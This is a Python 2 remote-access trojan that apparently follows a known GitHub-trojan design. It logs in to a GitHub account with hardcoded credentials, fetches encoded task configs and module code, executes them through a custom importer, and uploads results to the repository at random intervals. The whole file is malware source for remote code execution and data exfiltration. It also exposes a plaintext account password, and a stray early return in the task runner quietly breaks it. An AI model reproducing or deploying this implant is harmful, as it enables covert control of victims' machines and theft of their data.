import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

pigeon_id="a"

pigeon_config="%s.json" % pigeon_id
data_path = "data/%s" %pigeon_id
pigeon_modules= []
configured    = False
task_queue    = Queue.Queue()


def connect_to_server():
    gh = login(username="pawansankhle",password="lenovog470")
    repo = gh.repository("pawansankhle","pawan")
    branch = repo.branch("master")

    return gh,repo,branch

def get_file_contents(filepath):
     
    gh,repo,branch = connect_to_server()
    tree=branch.commit.commit.tree.recurse()
    

    for filename in tree.tree:
        
        if filepath in filename.path:
            print "[#] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    
    return None

def get_pigeon_config():
    global configured
    config_json = get_file_contents(pigeon_config)
    config      = json.loads(base64.b64decode(config_json))
    configured  = True

    for task in config:
        
        if task['module'] not in sys.modules:

            exec("import %s" % task['module'])
    
    return config

def store_module_result(data):
    gh,repo,branch=connect_to_server()
    remote_path = "data/%s/%d.data" % (pigeon_id,random.randint(100,1000))
    try:
        repo.create_file(remote_path,"new data adding",base64.b64encode(data))
    except:
		print "[*] Exception while storing data.."
    
    return

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self,fullname,path=None):
        if configured:
            print "[#] Attempting to retrives %s" %fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
              
                return self
      
        return None

    def load_module(self,name):
        try:
            module = imp.new_module(name)
            exec self.current_module_code in module.__dict__
            sys.modules[name] = module
        except :
			print "[#] Exception while loading module %s"
     
        return module

def module_runner(module):
	
    task_queue.put(1)
    print "[))] %s" % (sys.modules[module])
    return
    result = sys.modules[module].run()
    task_queue.get()
 
    store_module_result(result)

    return

sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_pigeon_config()

        for task in config:
			
			
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
     
    time.sleep(random.randint(1000,10000))
